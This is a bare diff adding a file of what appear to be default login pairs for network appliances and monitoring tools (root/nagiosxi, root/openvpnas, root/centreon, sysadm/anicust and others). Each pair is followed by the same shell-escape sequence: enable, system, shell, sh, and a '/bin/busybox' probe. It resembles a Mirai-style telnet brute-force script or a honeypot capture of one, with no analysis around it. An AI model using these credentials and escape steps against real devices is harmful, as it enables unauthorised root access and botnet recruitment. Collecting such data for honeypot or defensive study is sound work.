@@ -1,0 +1,52 @@
+root
+
+nagiosxi
+enable
+system
+shell
+sh
+/bin/busybox xn6aeqri
+root
+
+openvpnas
+enable
+system
+shell
+sh
+/bin/busybox xn6aeqri
+root
+
+centreon
+enable
+system
+shell
+sh
+/bin/busybox xn6aeqri
+secret
+enable
+system
+shell
+sh
+/bin/busybox xn6aeqri
+root
+
+54321
+enable
+system
+shell
+sh
+/bin/busybox xn6aeqri
+netics
+enable
+system
+shell
+sh
+/bin/busybox xn6aeqri
+sysadm
+
+anicust
+enable
+system
+shell
+sh
+/bin/busybox xn6aeqri
